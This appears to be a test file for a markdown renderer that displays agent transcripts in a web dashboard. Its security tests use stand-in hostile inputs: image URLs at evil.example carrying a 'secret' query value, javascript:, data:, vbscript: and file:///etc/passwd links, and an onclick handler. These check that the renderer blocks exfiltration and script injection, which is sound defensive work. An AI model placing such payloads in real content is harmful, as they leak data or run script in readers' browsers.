import { describe, expect, test } from "bun:test"
import { join } from "node:path"

import { ASK_CODE_COLUMNS } from "../../../../../packages/config/src/inbox"
import {
  SessionsContext,
  sessionsOf,
} from "../../../../../web/next/src/components/dashboard/dashboard"
import {
  TranscriptMarkdown,
  fitWidth,
  overlaysIn,
  untitle,
} from "../../../../../web/next/src/components/transcript-markdown"
import { config } from "../../../../../web/next/src/lib/config"

// React resolves from the web app's own packages, which this directory cannot see; the two calls the test makes are typed here rather than through a path into node_modules.
type Node = unknown
type CreateElement = (type: unknown, props?: unknown, ...children: Node[]) => Node
const web = join(import.meta.dir, "../../../../../web/next")
const { createElement } = (await import(Bun.resolveSync("react", web))) as {
  createElement: CreateElement
}
const { renderToStaticMarkup } = (await import(Bun.resolveSync("react-dom/server", web))) as {
  renderToStaticMarkup: (node: Node) => string
}

type Surface = "default" | "muted" | "none" | "tinted"

const render = (text: string, on: Surface = "none") =>
  renderToStaticMarkup(createElement(TranscriptMarkdown, { on }, text))

// Every attribute a browser fetches from on its own, with the URL it names.
const fetched = (html: string) =>
  [...html.matchAll(/\s(src|srcset|poster|background|data)="([^"]*)"/gi)].map((m) => m[2])

describe("TranscriptMarkdown", () => {
  test("an image from elsewhere, in markdown or raw HTML, loads nothing and shows as text", () => {
    for (const text of [
      "![a chart](https://evil.example/leak.png?secret=1)",
      'look <img src="https://evil.example/leak.png" alt="a chart">',
      '<picture><source srcset="https://evil.example/leak.png"><img src="https://evil.example/x.png" alt="a chart"></picture>',
      '<img srcset="https://evil.example/leak.png 1x" alt="a chart">',
    ]) {
      const html = render(text)
      expect(fetched(html)).toEqual([])
      // Streamdown's own hardening catches some first, with its own words.
      expect(html).toMatch(/\[image: a chart\]|\[Image blocked: a chart\]/)
      expect(html).not.toContain("<source")
    }
  })

  test("on every bubble, an image from elsewhere still loads nothing", () => {
    for (const on of ["default", "muted", "tinted"] as const) {
      expect(fetched(render("![x](https://evil.example/leak.png)", on))).toEqual([])
    }
  })

  test("our own attachment loads", () => {
    const src = `${new URL(config.api.url).origin}/api/v1/attachments/3ec1fab9-9dd4-4327-8bac-642ce1981bf9.png`
    expect(fetched(render(`![shot](${src})`))).toEqual([src])
  })

  test("a preview image loads, and a preview page does not load as one", () => {
    const src = `${new URL(config.api.url).origin}/api/v1/apps/previews/spinner-light-1.png`
    expect(fetched(render("![shot](/api/v1/apps/previews/spinner-light-1.png)"))).toEqual([src])
    expect(fetched(render("![page](/api/v1/apps/previews/spinner-preview.html)"))).toEqual([])
  })

  // A loading image takes no room, so rows below it in the chat dropped by its height once it arrived
  test("an image keeps its box from first paint, before it loads", () => {
    const html = render("![shot](/api/v1/apps/previews/spinner-light-1.png)")
    expect(html).toMatch(/<span class="[^"]*\bh-48\b[^"]*"><img /)
    expect(html).toMatch(/<img [^>]*class="[^"]*\bmax-h-full\b/)
  })

  test("a link loads nothing until it is followed", () => {
    const html = render("[docs](https://example.com/docs)")
    expect(fetched(html)).toEqual([])
    expect(html).toContain("docs")
  })
})

// A link the owner opens from here is trusted, so it opens with no extra pop-up.
describe("links", () => {
  const anchors = (html: string) => [...decode(html).matchAll(/<a\s[^>]*>/g)].map((m) => m[0])
  // Every attribute of an anchor but its class, which the formatter may reorder.
  const attributes = (anchor: string) =>
    Object.fromEntries(
      [...anchor.matchAll(/\s([\w-]+)="([^"]*)"/g)]
        .filter((m) => m[1] !== "class")
        .map((m) => [m[1], m[2]]),
    )
  const opensElsewhere = (href: string) => ({
    "data-streamdown": "link",
    href,
    rel: "noopener noreferrer",
    target: "_blank",
  })

  test("a link is a plain anchor that opens another site in a new tab, with no prompt", () => {
    for (const text of [
      "[the PR](https://github.com/acme/archive/pull/1)",
      "see https://github.com/acme/archive/pull/1",
      '<a href="https://github.com/acme/archive/pull/1">the PR</a>',
    ]) {
      const html = render(text)
      expect(html).not.toContain("<button")
      expect(anchors(html).map(attributes)).toEqual([
        opensElsewhere("https://github.com/acme/archive/pull/1"),
      ])
    }
  })

  test("a raw tag's own target, rel or handler is dropped", () => {
    const html = render(
      '<a href="https://example.com/" target="_self" rel="opener" onclick="alert(1)">x</a>',
    )
    expect(anchors(html).map(attributes)).toEqual([opensElsewhere("https://example.com/")])
  })

  test("a path of our own opens in this tab", () => {
    const [anchor] = anchors(render("[sessions](/dashboard/sessions)"))
    expect(anchor).toContain(`href="${new URL("/dashboard/sessions", config.app.url).href}"`)
    expect(anchor).not.toContain("target=")
  })

  // An @Name that names a live agent links to its view, as the sender label does, and keeps the agent's raw session name on hover. The dashboard here holds one live session, builder.
  describe("with a dashboard", () => {
    const dashboard = sessionsOf(
      [{ name: "builder", sessionId: "s-1" }] as unknown as Parameters<typeof sessionsOf>[0],
      null,
    )
    const inDashboard = (text: string) =>
      renderToStaticMarkup(
        createElement(
          SessionsContext,
          { value: dashboard },
          createElement(TranscriptMarkdown, {}, text),
        ),
      )

    test("a mention of a live agent links to its view with the raw name on hover", () => {
      const html = inDashboard("ask @builder to look")
      const anchor = anchors(html).find((a) =>
        a.includes(`href="${new URL("/dashboard?worker=s-1", config.app.url).href}"`),
      )
      expect(anchor).toBeDefined()
      expect(anchor).toContain('aria-description="builder"')
      expect(html).toContain("ask")
      expect(html).toContain("to look")
    })

    test("a mention that names no live agent stays words with no anchor", () => {
      const html = inDashboard("ask @nobody-here to look")
      expect(anchors(html)).toEqual([])
      expect(html).toContain("@nobody-here")
    })

    test("a link to a worker's view that a session wrote keeps the raw name on hover too", () => {
      const html = inDashboard("[Builder](/dashboard?worker=s-1)")
      const anchor = anchors(html).find((a) =>
        a.includes(`href="${new URL("/dashboard?worker=s-1", config.app.url).href}"`),
      )
      expect(anchor).toContain('aria-description="builder"')
    })
  })

  test("a fragment or a footnote stays on this page, in this tab", () => {
    for (const [text, href] of [
      ["[top](#needs-you-1)", "#needs-you-1"],
      ["A note[^1].\n\n[^1]: The footnote.", "#user-content-fn-1"],
    ] as const) {
      const anchor = anchors(render(text)).find((a) => a.includes(`href="${href}"`))
      expect(anchor).toBeDefined()
      expect(anchor).not.toContain("target=")
    }
  })

  // The back-link (↩) jumps to the reference's id, so the reference keeps it.
  test("a footnote's reference keeps its id and its back-link finds it", () => {
    const html = decode(render("A note[^1].\n\n[^1]: The footnote."))
    const reference = anchors(html).find((a) => a.includes('href="#user-content-fn-1"'))
    expect(reference).toContain('id="user-content-fnref-1"')
    expect(reference).toContain('aria-describedby="footnote-label"')
    expect(reference).toContain("data-footnote-ref")
    const back = anchors(html).find((a) => a.includes('href="#user-content-fnref-1"'))
    expect(back).toContain("data-footnote-backref")
    expect(back).toContain('aria-label="Back to reference 1"')
  })

  // A raw tag's id is not prefixed, so one of the page's own (needs-you-<id>, a global) would pass.
  test("a raw tag's id passes only as a footnote's", () => {
    for (const id of ["needs-you-1", "config", "__next"]) {
      const [anchor] = anchors(render(`<a href="https://example.com/" id="${id}">x</a>`))
      expect(anchor).not.toContain("id=")
    }
  })

  // A browser reads "//host" and "/\host" as another host; Streamdown's own hardening may turn them into a path of ours first, and either way no other site opens in this tab.
  test("a protocol-relative or backslashed link never opens another site in this tab", () => {
    const app = new URL(config.app.url).host
    for (const href of ["//evil.example/x", "/\\evil.example/x", "/\t/evil.example/x"]) {
      for (const text of [`<a href="${href}">x</a>`, `[x](${href})`]) {
        for (const anchor of anchors(render(text))) {
          const host = new URL(anchor.match(/href="([^"]*)"/)![1]!).host
          if (host !== app) expect(anchor).toContain('target="_blank"')
        }
      }
    }
  })

  test("every other scheme shows as text, with no anchor", () => {
    for (const href of [
      "javascript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "file:///etc/passwd",
      "vbscript:msgbox(1)",
      "mailto:someone@example.com",
    ]) {
      for (const text of [`[click](${href})`, `<a href="${href}">click</a>`]) {
        const html = render(text)
        expect(anchors(html)).toEqual([])
        expect(html).not.toContain(href.split(":")[0] + ":")
        expect(html).toContain("click")
      }
    }
  })
})

// The terminal shows a message with its line breaks; markdown alone folds a single newline into its paragraph, which ran a session's two-line reply together in the stream.
describe("line breaks", () => {
  test("a session's own reply keeps its line breaks, as his messages and a peer's do", () => {
    for (const on of ["default", "muted", "tinted"] as const) {
      const html = render("Fixture reply, line one.\nLine two, right under it.", on)
      expect(html).toMatch(/line one\.<br\/>\s*Line two/)
    }
  })

  test("a blank line still starts a new paragraph, and a code block keeps its own lines", () => {
    const html = render("one\n\ntwo\n```\na\nb\n```")
    expect(html).toMatch(/<p[^>]*>one<\/p>\s*<p[^>]*>two<\/p>/)
    expect(html).not.toMatch(/a<br\/>/)
  })
})

const decode = (markup: string) => markup.replaceAll("&amp;", "&")

// His message sits on the primary colour, which Streamdown also gives a link and inline code's text, so they vanished: on that bubble they take the bubble's own text colour and inline code a tint of it, while a code block keeps the page's own background and colours.
describe("on a bubble", () => {
  const html = (on: Surface) =>
    decode(render("https://example.com/issue/ABC-1 see `inline` here\n```\nblock\n```", on))

  test("his bubble gives its links and inline code colours that stand out on it", () => {
    const page = html("default")
    expect(page).toContain('data-streamdown="link"')
    expect(page).toContain('data-streamdown="inline-code"')
    for (const style of [
      "[&_[data-streamdown=link]]:text-current",
      "[&_[data-streamdown=link]]:decoration-current/60",
      "[&_[data-streamdown=inline-code]]:bg-primary-foreground/15",
      "[&_[data-streamdown=inline-code]]:text-current",
    ]) {
      expect(page).toContain(style)
    }
  })

  test("a session's own bubble and a peer's set inline code apart, and a bare page changes nothing", () => {
    expect(html("muted")).toContain("[&_[data-streamdown=inline-code]]:bg-background")
    expect(html("tinted")).toContain("[&_[data-streamdown=inline-code]]:bg-background/60")
    expect(html("none")).not.toContain("[&_[data-streamdown=")
  })

  test("a code block sits on the page's own background on every bubble, so its colours read", () => {
    for (const on of ["default", "muted", "none", "tinted"] as const)
      expect(html(on)).toMatch(
        /data-slot="code-block" [^>]*class="[^"]*\bbg-background\b[^"]*\bdark:bg-background\b/,
      )
  })
})

// A fenced block and a table each draw in one border, with nothing kept above them for actions.
describe("code blocks and tables", () => {
  const page = (text: string) => decode(render(text)).replaceAll("&gt;", ">")

  test("a fenced block is shadcn's CodeBlock, one border with Copy over its corner, its lines wrapping", () => {
    const html = page("```ts\nconst a = 1\nconst b = 2\n```")
    expect(html.match(/data-slot="code-block"/g)).toHaveLength(1)
    expect(html).toMatch(
      /data-slot="tooltip-trigger" class="[^"]*\[\[data-slot=code-block\]>&\]:absolute[^"]*"[^>]*><button[^>]*data-slot="code-block-copy-button"[^>]*aria-label="Copy"/,
    )
    expect(html).toContain("data-wrap")
    expect(html.match(/data-slot="code-block-line"/g)).toHaveLength(2)
    expect(html).toContain("const a = 1")
    for (const stock of [
      'data-slot="code-block-header"',
      "code-block-body",
      'data-streamdown="code-block"',
    ])
      expect(html).not.toContain(stock)
  })

  // Each line's variant, with the words it shows.
  const lines = (html: string) =>
    [
      ...html.matchAll(
        /data-slot="code-block-line" data-variant="(\w+)"[^>]*><span data-slot="code-block-line-content"[^>]*>([^<]*)</g,
      ),
    ].map((m) => [m[1], m[2]])

  test("a diff block tints its added and removed lines, its sign shown once by the line's marker", () => {
    const html = page(
      "```diff\n--- a/limit.ts\n+++ b/limit.ts\n@@ -1 +1 @@\n- const limit = 100\n+ const limit = rows.length\n same\n```",
    )
    expect(lines(html)).toEqual([
      ["default", "--- a/limit.ts"],
      ["default", "+++ b/limit.ts"],
      ["default", "@@ -1 +1 @@"],
      ["removed", " const limit = 100"],
      ["added", " const limit = rows.length"],
      ["default", " same"],
    ])
    expect(html).toMatch(/data-variant="added" class="[^"]*\bbg-success\/10\b/)
    expect(html).toMatch(/data-variant="removed" class="[^"]*\bbg-destructive\/10\b/)
  })

  test("a line starting + or - in any other block stays a plain line", () => {
    for (const language of ["", "ts", "md"])
      expect(lines(page(`\`\`\`${language}\n- a\n+ b\n\`\`\``))).toEqual([
        ["default", "- a"],
        ["default", "+ b"],
      ])
  })

  test("inline code stays Streamdown's own", () => {
    const html = page("see `inline` here")
    expect(html).toContain('data-streamdown="inline-code"')
    expect(html).not.toContain('data-slot="code-block"')
  })

  test("a table is shadcn's Table inside one bordered box, with no action row", () => {
    const html = page("| Name | State |\n| --- | --- |\n| #197 | Open |")
    expect(html).toMatch(/<div class="[^"]*\bborder\b[^"]*"><div data-slot="table-container"/)
    for (const slot of [
      "table",
      "table-header",
      "table-body",
      "table-row",
      "table-head",
      "table-cell",
    ])
      expect(html).toContain(`data-slot="${slot}"`)
    expect(html).toContain(">#197<")
    expect(html).not.toContain('data-streamdown="table-wrapper"')
    expect(html).not.toMatch(/aria-label="(Copy|Download|Fullscreen|View fullscreen)[^"]*table/i)
    expect(html).not.toContain(" node=")
  })
})

describe("a progress block", () => {
  const BLOCK = [
    "```progress",
    "Mac reads | 100 | Reads every Mac | 9:10 pm",
    "Yard channel | 40% | Posts land in the channel | 1:00 am",
    "```",
  ].join("\n")
  const shown = (text: string, card: boolean) =>
    decode(renderToStaticMarkup(createElement(TranscriptMarkdown, { card }, text)))

  test("draws each item as a bar at the full width, with its name, percent, words and ETA, on a card and in the viewer (PG-2617)", () => {
    for (const card of [true, false]) {
      const html = shown(BLOCK, card)
      expect(html).not.toContain('data-slot="code-block"')
      // the name column stops at 6rem, so a long name never narrows the bars (PG-2617, a 63-character name left 64px bars)
      expect(html).toContain("grid-cols-[fit-content(6rem)_minmax(4rem,1fr)_auto]")
      const bars = [...html.matchAll(/<[^>]*role="progressbar"[^>]*>/g)].map((m) => m[0])
      expect(bars).toHaveLength(2)
      expect(bars[0]).toContain('aria-valuenow="100"')
      // a row at 100 that names no state reads as done (PG-2730)
      expect(bars[0]).toContain('aria-label="Mac reads, done"')
      expect(bars[1]).toContain('aria-label="Yard channel"')
      expect(bars[1]).toContain('aria-valuenow="40"')
      expect(html.match(/data-slot="progress-track"[^>]*class="[^"]*\bw-full\b/g)).toHaveLength(2)
      for (const words of ["Mac reads", "100%", "Reads every Mac", "9:10 pm", "40%", "1:00 am"])
        expect(html).toContain(`>${words}<`)
    }
  })

  test("a block that does not read stays the plain code block, as written", () => {
    for (const card of [true, false]) {
      const html = shown("```progress\nYard channel | 140 | Posts | 1:00 am\n```", card)
      expect(html).not.toContain('role="progressbar"')
      expect(html).toContain('data-slot="code-block"')
      expect(html).toContain('data-language="progress"')
      expect(html).toContain("Yard channel | 140 | Posts | 1:00 am")
    }
  })
})

describe("a drawing on a card", () => {
  test("its font shrinks from the card's 12px code size to fit its widest line, down to 10px", () => {
    expect(fitWidth(37)).toBe("clamp(10px, calc((100cqi - 1.25rem) / 37), 12px)")
  })

  test("the widest line an ask's drawing runs is the owner's chosen width, which a narrow card shrinks to 10px or scrolls", () => {
    expect(ASK_CODE_COLUMNS).toBe(72)
  })
})

describe("the highlighter", () => {
  test("a ts block's tokens take the theme's light and dark colours", async () => {
    const { highlightCode } = await import("../../../../../web/next/src/lib/highlighter")
    const lines = await highlightCode("const a = 1", "ts")
    expect(lines).not.toBeNull()
    const html = renderToStaticMarkup(createElement("div", null, ...(lines as Node[])))
    expect(html).toContain("text-(--shiki-light)")
    expect(html).toContain("dark:text-(--shiki-dark)")
    expect(html).toMatch(/--shiki-light:#[0-9a-f]{6}/i)
  })

  test.each([
    ["ts", "const a: number = 1"],
    ["tsx", "const a = <b>c</b>"],
    ["json", '{ "a": 1 }'],
    ["sh", "bun run verify pages"],
  ])("a %s fence reaches the highlighter as its language", async (language, line) => {
    const html = render(`\`\`\`${language}\n${line}\n\`\`\``)
    const read =
      /data-slot="code-block"[^>]*data-language="([^"]+)"|data-language="([^"]+)"[^>]*data-slot="code-block"/.exec(
        html,
      )
    const named = read?.[1] ?? read?.[2]
    expect(named).toBe(language)
    const { highlightCode } = await import("../../../../../web/next/src/lib/highlighter")
    const lines = await highlightCode(line, named ?? "")
    expect(lines).not.toBeNull()
    expect(renderToStaticMarkup(createElement("div", null, ...(lines as Node[])))).toContain(
      "--shiki-light:",
    )
  })

  test("an unknown language reads as plain text", async () => {
    const { highlightCode } = await import("../../../../../web/next/src/lib/highlighter")
    expect(await highlightCode("x", "not-a-language")).toBeNull()
  })
})

describe("headings", () => {
  const classOf = (html: string, tag: string) =>
    new RegExp(`<${tag}[^>]*\\sclass="([^"]*)"`, "i").exec(html)?.[1] ?? ""

  test("a pasted heading sits near the body's size, semibold with tight margins", () => {
    const html = render("# One\n\n## Two\n\n### Three")
    for (const [tag, size] of [
      ["h1", "text-base"],
      ["h2", "text-sm"],
      ["h3", "text-sm"],
    ] as const) {
      const classes = classOf(html, tag)
      expect(classes, tag).toContain(size)
      expect(classes, tag).toContain("font-semibold")
      expect(classes, tag).toContain("mt-3")
      expect(classes, tag).toContain("first:mt-0")
    }
    for (const tooBig of ["text-3xl", "text-2xl", "text-xl"]) expect(html).not.toContain(tooBig)
  })

  test("h4 to h6 sit with h2 and h3, so no deeper heading outgrows a shallower one", () => {
    const html = render("#### Four\n\n##### Five\n\n###### Six")
    for (const tag of ["h4", "h5", "h6"] as const) {
      const classes = classOf(html, tag)
      expect(classes, tag).toContain("text-sm")
      expect(classes, tag).toContain("font-semibold")
      expect(classes, tag).toContain("mt-3")
      expect(classes, tag).toContain("first:mt-0")
    }
    expect(html).not.toContain("text-lg")
  })
})

describe("one Streamdown", () => {
  test("no file but transcript-markdown.tsx renders with Streamdown, so no element brings its own and skips the image rule", async () => {
    const files = new Bun.Glob("src/**/*.{ts,tsx}").scan({ cwd: web })
    const importers: string[] = []
    for await (const file of files) {
      const source = await Bun.file(join(web, file)).text()
      // a named Streamdown, a default or namespace import, a re-export or a dynamic import all reach the component; a type or a helper alone does not
      const reaches =
        /(?:import|export)\s*(?:\{[^}]*\bStreamdown\b[^}]*\}|\*(?:\s*as\s+\w+)?|(?!type\b)\w+)[^;]*?from\s*["']streamdown["']|import\(\s*["']streamdown["']\s*\)/
      if (reaches.test(source)) {
        importers.push(file)
      }
    }
    expect(importers).toEqual(["src/components/transcript-markdown.tsx"])
  })
})

// GitHub-style callouts, which a transcript may write, each rendered in its kind's style.
describe("callouts", () => {
  test("each kind renders as a titled note with its marker gone", () => {
    for (const [marker, title] of [
      ["NOTE", "Note"],
      ["TIP", "Tip"],
      ["IMPORTANT", "Important"],
      ["WARNING", "Warning"],
      ["CAUTION", "Caution"],
    ]) {
      const html = render(`> [!${marker}]\n> The review is at 4 of 5.`)
      expect(html).toContain(`data-callout="${marker.toLowerCase()}"`)
      expect(html).toContain(`>${title}</div>`)
      expect(html).toContain("The review is at 4 of 5.")
      expect(html).not.toContain(`[!${marker}]`)
      expect(html).not.toContain("<blockquote")
    }
  })

  test("a marker on the same line as its words keeps the words", () => {
    const html = render("> [!TIP] Merge the small change first.")
    expect(html).toContain('data-callout="tip"')
    expect(html).toContain("Merge the small change first.")
  })

  test("a plain quote, an unknown marker or a marker not at the start stays a quote", () => {
    for (const text of ["> just a quote", "> [!VIBE]\n> words", "> words [!NOTE]"]) {
      const html = render(text)
      expect(html).toContain("<blockquote")
      expect(html).not.toContain("data-callout")
    }
  })

  test("a raw tag cannot pose as a callout", () => {
    const html = render('<blockquote data-callout="warning">words</blockquote>')
    expect(html).not.toContain("data-callout")
  })

  test("a link or an image inside a callout still keeps the transcript's rules", () => {
    const html = decode(
      render(
        "> [!NOTE]\n> See [the PR](https://github.com/acme/archive/pull/1) and ![x](https://evil.example/leak.png) and [bad](javascript:alert(1))",
      ),
    )
    expect(html).toContain('data-callout="note"')
    expect(fetched(html)).toEqual([])
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).not.toContain("javascript:")
  })

  test("our own attachment inside a callout loads, in its fixed box", () => {
    const src = `${new URL(config.api.url).origin}/api/v1/attachments/3ec1fab9-9dd4-4327-8bac-642ce1981bf9.png`
    const html = render(`> [!TIP]\n> ![shot](${src})`)
    expect(html).toContain('data-callout="tip"')
    expect(fetched(html)).toEqual([src])
    expect(html).toMatch(/<span class="[^"]*\bh-48\b[^"]*"><img /)
  })

  test("the kind's colour sits on the callout, so its icon and title take it", () => {
    expect(render("> [!WARNING]\n> words")).toMatch(
      /<div [^>]*data-callout="warning"[^>]*class="[^"]*\btext-warning\b|<div [^>]*class="[^"]*\btext-warning\b[^"]*"[^>]*data-callout="warning"/,
    )
  })

  test("a table renders as a table", () => {
    const html = render("| PR | State |\n| --- | --- |\n| #101 | In review |")
    expect(html).toContain("<table")
    expect(html).toContain("In review")
  })
})

describe("untitle", () => {
  // A stand-in for an element: its attributes alone.
  const element = (attrs: Record<string, string>, textContent = "") => {
    const map = new Map(Object.entries(attrs))
    return {
      attrs: map,
      textContent,
      getAttribute: (name: string) => map.get(name) ?? null,
      hasAttribute: (name: string) => map.has(name),
      removeAttribute: (name: string) => void map.delete(name),
      setAttribute: (name: string, value: string) => void map.set(name, value),
    }
  }

  test("drops every title, naming an element by it where it has no name of its own", () => {
    // Streamdown's Copy table button has a title and no aria-label; its code Copy button has both
    const table = element({ title: "Copy table" })
    const code = element({ "aria-label": "Copy Code", title: "Copy Code" })
    const raw = element({ title: "  " })
    untitle([table, code, raw])
    expect(Object.fromEntries(table.attrs)).toEqual({ "aria-label": "Copy table" })
    expect(Object.fromEntries(code.attrs)).toEqual({ "aria-label": "Copy Code" })
    expect(Object.fromEntries(raw.attrs)).toEqual({})
  })

  test("an element with words of its own keeps them as its name, the title becoming its description", () => {
    // Streamdown's table menu item reads Markdown, titled Copy table as Markdown
    const item = element({ title: "Copy table as Markdown" }, "Markdown")
    untitle([item])
    expect(Object.fromEntries(item.attrs)).toEqual({ "aria-description": "Copy table as Markdown" })
  })
})

describe("overlaysIn", () => {
  test("puts Streamdown's overlays in one node on the body whose titles an observer strips, made once", () => {
    const titled = { attrs: new Map([["title", "Copy table"]]), textContent: "" }
    const button = {
      getAttribute: (name: string) => titled.attrs.get(name) ?? null,
      hasAttribute: (name: string) => titled.attrs.has(name),
      removeAttribute: (name: string) => void titled.attrs.delete(name),
      setAttribute: (name: string, value: string) => void titled.attrs.set(name, value),
      textContent: titled.textContent,
    }
    const node = { dataset: {} as Record<string, string>, querySelectorAll: () => [button] }
    let appended: unknown = null
    const doc = {
      body: { append: (child: unknown) => void (appended = child) },
      createElement: () => node,
      querySelector: () => appended,
    } as unknown as Document
    const watched: { options?: MutationObserverInit; target?: unknown; strip?: () => void } = {}
    class Observer {
      constructor(strip: () => void) {
        watched.strip = strip
      }
      observe(target: unknown, options: MutationObserverInit) {
        Object.assign(watched, { options, target })
      }
    }
    const made = overlaysIn(doc, Observer as unknown as typeof MutationObserver)
    expect(made).toBe(node as unknown as HTMLElement)
    expect(appended).toBe(node)
    expect(node.dataset.transcriptOverlays).toBe("")
    expect(watched.target).toBe(node)
    expect(watched.options).toEqual({ attributeFilter: ["title"], childList: true, subtree: true })
    watched.strip?.()
    expect(Object.fromEntries(titled.attrs)).toEqual({ "aria-label": "Copy table" })
    expect(overlaysIn(doc, Observer as unknown as typeof MutationObserver)).toBe(made)
  })
})
